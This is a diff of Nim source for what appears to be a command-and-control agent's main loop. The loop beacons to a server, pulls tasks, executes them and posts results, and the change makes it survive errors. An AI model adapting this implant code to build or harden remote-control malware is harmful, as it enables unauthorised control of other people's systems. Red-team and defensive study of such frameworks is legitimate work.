@@ -1,5 +1,4 @@
 import strformat, os, times, system, base64
-import winim
 
 import core/[task, taskresult, heartbeat, http, register]
 import ../modules/manager
@@ -81,29 +80,34 @@ proc main() =
         let date: string = now().format("dd-MM-yyyy HH:mm:ss")
         echo fmt"[{date}] Checking in."
 
-        # Retrieve task queue for the current agent by sending a check-in/heartbeat request
-        # The check-in request contains the agentId, listenerId, so the server knows which tasks to return
-        var heartbeat: Heartbeat = config.createHeartbeat()
-        let 
-            heartbeatBytes: seq[byte] = config.serializeHeartbeat(heartbeat)
-            packet: string = config.getTasks(heartbeatBytes)
+        try: 
+            # Retrieve task queue for the current agent by sending a check-in/heartbeat request
+            # The check-in request contains the agentId, listenerId, so the server knows which tasks to return
+            var heartbeat: Heartbeat = config.createHeartbeat()
+            let 
+                heartbeatBytes: seq[byte] = config.serializeHeartbeat(heartbeat)
+                packet: string = config.getTasks(heartbeatBytes)
 
-        if packet.len <= 0: 
-            echo "No tasks to execute."
-            continue
+            if packet.len <= 0: 
+                echo "No tasks to execute."
+                continue
 
-        let tasks: seq[Task] = config.deserializePacket(packet)
+            let tasks: seq[Task] = config.deserializePacket(packet)
+            
+            if tasks.len <= 0: 
+                echo "No tasks to execute."
+                continue
+
+            # Execute all retrieved tasks and return their output to the server
+            for task in tasks: 
+                var result: TaskResult = config.handleTask(task)
+                let resultBytes: seq[byte] = config.serializeTaskResult(result)
+
+                config.postResults(resultBytes)
+
+        except CatchableError as err: 
+            echo "[-] ", err.msg
         
-        if tasks.len <= 0: 
-            echo "No tasks to execute."
-            continue
-
-        # Execute all retrieved tasks and return their output to the server
-        for task in tasks: 
-            var result: TaskResult = config.handleTask(task)
-            let resultBytes: seq[byte] = config.serializeTaskResult(result)
-
-            config.postResults(resultBytes)
             
 when isMainModule: 
     main() 
